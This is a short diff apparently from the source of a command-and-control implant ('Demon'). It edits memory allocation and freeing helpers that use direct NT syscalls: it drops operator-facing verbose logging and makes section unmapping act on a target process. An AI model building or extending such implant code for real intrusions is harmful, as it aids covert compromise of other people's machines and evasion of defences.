@@ -69,11 +69,6 @@ PVOID MmVirtualAlloc(
     PVOID    Memory   = NULL;
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    if ( Instance->Config.Implant.Verbose && ( Methode != DX_MEM_DEFAULT ) ) {
-        Package = PackageCreate( DEMON_INFO );
-        PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
-    }
-
     switch ( Methode )
     {
         case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" ) {
@@ -231,7 +226,7 @@ BOOL MmVirtualFree(
     // check if it's a mapped image
     //
     if ( ( MmBasic.Type == MEM_MAPPED ) ) {
-        return NT_SUCCESS( SysNtUnmapViewOfSection( NtCurrentProcess(), Memory ) );
+        return NT_SUCCESS( SysNtUnmapViewOfSection( Process, Memory ) );
     } else {
         return NT_SUCCESS( SysNtFreeVirtualMemory( Process, &Memory, &Length, MEM_RELEASE ) );
     }
